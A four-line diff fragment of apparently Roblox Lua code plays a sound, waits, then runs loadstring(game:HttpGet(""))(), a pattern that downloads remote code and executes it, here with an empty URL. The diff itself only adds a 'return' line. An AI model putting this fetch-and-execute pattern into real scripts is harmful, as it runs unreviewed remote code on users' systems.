@@ -4,3 +4,4 @@
     sound:Play()
 task.wait(1.0)
 loadstring(game:HttpGet(""))()
+return
